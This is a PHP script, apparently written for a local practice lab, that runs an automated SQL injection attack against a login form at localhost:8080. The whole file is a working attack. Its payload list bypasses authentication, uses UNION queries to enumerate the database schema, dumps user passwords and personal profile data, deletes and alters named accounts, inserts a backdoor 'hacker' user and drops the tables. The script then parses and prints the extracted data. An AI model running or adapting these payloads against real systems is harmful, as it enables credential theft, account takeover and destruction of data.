<?php
$target = "http://localhost:8080";
$table_dropped = false;

$payloads = [
    "' OR 1=1; --",
    "alessio.rossi' -- ",
    "' UNION SELECT NULL, GROUP_CONCAT(table_name), NULL FROM information_schema.tables WHERE table_schema = DATABASE()-- -",
    "' UNION SELECT NULL, GROUP_CONCAT(column_name), NULL FROM information_schema.columns WHERE table_name='profiles' AND table_schema=DATABASE()-- -",
    "' UNION SELECT NULL, GROUP_CONCAT(column_name), NULL FROM information_schema.columns WHERE table_name='users' AND table_schema=DATABASE()-- -",
    "' UNION SELECT id, username, password FROM users-- -",
    "' UNION SELECT user_id, telefono, nazionalita FROM profiles-- -",
    "'; DELETE FROM users WHERE username='andrea.moretto'; --",
    "'; UPDATE users SET password='123456' WHERE username='martina.bianchi'; -- ",
    "'; INSERT INTO users (username, password) VALUES ('hacker', 'hacked123'); SELECT * FROM users WHERE 1=1; --",
    "'; DROP TABLE profiles; DROP TABLE users; --"
];

foreach ($payloads as $payload) {
    if ($table_dropped && str_contains($payload, 'users')) {
        echo "\n[!] SKIPPATO: Tabella users già eliminata\n";
        echo "-----------------------------\n";
        continue;
    }

    $username = urlencode($payload);
    $password = urlencode($payload);
    $url = "$target?username=$username&password=$password";

    echo "\n[+] Testando: $payload\n";
    $response = @file_get_contents($url);

    if ($response === false) {
        echo "[-] Errore connessione\n";
        continue;
    }

    if (str_contains($payload, 'DROP TABLE')) {
        $verify_url = "$target?username=' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=DATABASE() -- &password=123";
        $verify_response = @file_get_contents($verify_url);
        
        if (strpos($verify_response, 'users') === false) {
            echo "[+] SUCCESS: Tabella eliminata\n";
            $table_dropped = true;
        } else {
            echo "[-] FAIL: Tabellaancora presente\n";
        }
    } else {
        if ($table_dropped && preg_match('/<div class="success">.*users.*<\/div>/is', $response)) {
            echo "[!] RISULTATO INATTESO: La tabella risulta ancora accessibile\n";
        } elseif (preg_match_all('/<div class="success">(.*?)<\/div>/is', $response, $matches)) {
            foreach ($matches[1] as $block) {
                $clean = str_replace(['<br>', '<br/>', '<br />'], "\n", $block);
                $decoded = html_entity_decode(strip_tags($clean));
                $lines = array_filter(array_map('trim', explode("\n", $decoded)));

                if (str_contains($payload, "information_schema.columns")) {
                    $labels = ['col1', 'col2', 'col3'];
                } elseif (str_contains($payload, 'profiles')) {
                    $labels = ['user_id', 'telefono', 'nazionalità'];
                } else {
                    $labels = ['id', 'username', 'password'];
                }

                for ($i = 0; $i < count($lines); $i += 3) {
                    $a = $lines[$i] ?? '';
                    $b = $lines[$i + 1] ?? '';
                    $c = $lines[$i + 2] ?? '';
                    echo "{$labels[0]}: $a | {$labels[1]}: $b | {$labels[2]}: $c\n";
                }
            }
        }
    }

    echo "-----------------------------\n";
}
?>